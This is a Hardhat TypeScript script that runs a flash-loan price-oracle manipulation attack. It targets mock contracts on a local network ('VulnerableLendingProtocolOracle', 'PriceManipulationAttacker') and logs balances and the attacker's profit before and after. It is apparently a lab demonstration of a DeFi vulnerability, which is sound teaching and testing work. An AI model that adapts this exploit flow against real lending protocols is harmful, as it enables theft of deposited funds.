// npx hardhat run scripts/run-exploit.ts --network localhost
import { ethers } from "hardhat";
import type { AddressLike, Log, LogDescription } from "ethers";
import * as fs from "fs/promises";
import * as path from "path";

const FLASH_AMOUNT = ethers.parseEther("500000"); // USD flash loan

type Addrs = {
  coll: string;
  usd: string;
  amm: string;
  pool: string;
  protocol: string;
  attacker: string;
};

async function loadAddresses(): Promise<Addrs> {
  const p = path.join(process.cwd(), "deployments", "latest-oracle.json");
  const raw = await fs.readFile(p, "utf8");
  const j = JSON.parse(raw);
  for (const k of ["coll", "usd", "amm", "pool", "protocol", "attacker"]) {
    if (!j[k]) throw new Error(`Missing '${k}' in ${p}`);
  }
  return j;
}

async function main() {
  const [deployer] = await ethers.getSigners();
  console.log(`Deployer: ${deployer.address}`);

  const ADDRS = await loadAddresses();
  const coll     = await ethers.getContractAt("FakeToken", ADDRS.coll);
  const usd      = await ethers.getContractAt("FakeToken", ADDRS.usd);
  const amm      = await ethers.getContractAt("SimpleAMM", ADDRS.amm);
  const pool     = await ethers.getContractAt("MockLendingPool", ADDRS.pool);
  const protocol = await ethers.getContractAt("VulnerableLendingProtocolOracle", ADDRS.protocol);
  const attacker = await ethers.getContractAt("PriceManipulationAttacker", ADDRS.attacker);

  const collAddr = await coll.getAddress();
  const usdAddr  = await usd.getAddress();

  const bal = async (t: any, a: AddressLike) => ethers.formatEther(await t.balanceOf(a));

  // Spot price before (COL in USD)
  const priceBefore = await amm.getSpotPrice(collAddr, usdAddr);
  console.log(`\nSpot price before: 1 COL = ${ethers.formatEther(priceBefore)} USD`);

  const poolAddr = await pool.getAddress();
  const atkAddr  = await attacker.getAddress();
  const protoAddr= await protocol.getAddress();

  console.log("\n--- Balances (before) ---");
  console.log("Pool USD:     ", await bal(usd, poolAddr));
  console.log("Protocol USD: ", await bal(usd, protoAddr));
  console.log("Attacker USD: ", await bal(usd, atkAddr));
  console.log("Attacker COL: ", await bal(coll, atkAddr));

  // Trigger exploit
  const tx = await attacker.attack(FLASH_AMOUNT);
  const rc = await tx.wait();

  // Parse ProfitStable event
  const parsed: LogDescription[] = rc!.logs
    .map((l: Log): LogDescription | null => {
      try { return attacker.interface.parseLog(l); } catch { return null; }
    })
    .filter((x: any): x is LogDescription => x !== null);
  const profitLog = parsed.find((e) => e.name === "ProfitStable");
  if (profitLog) {
    console.log(`\n✅ Profit event (pre-pull): ${ethers.formatEther(profitLog.args.profit)} USD (emitted just before pool pulls loan+fee)`);
  } else {
    console.log("\nℹ️ No ProfitStable event found.");
  }

  // After flash settles, check balances
  const priceAfter = await amm.getSpotPrice(collAddr, usdAddr);
  console.log(`\nSpot price after : 1 COL = ${ethers.formatEther(priceAfter)} USD`);

  console.log("\n--- Balances (after) ---");
  console.log("Pool USD:     ", await bal(usd, poolAddr));   // should increase by premium
  console.log("Protocol USD: ", await bal(usd, protoAddr));  // should drop by borrowed amount
  console.log("Attacker USD: ", await bal(usd, atkAddr));    // attacker holds profit in USD
  console.log("Attacker COL: ", await bal(coll, atkAddr));   // likely 0; all deposited as collateral
}

main().catch((e) => { console.error(e); process.exit(1); });
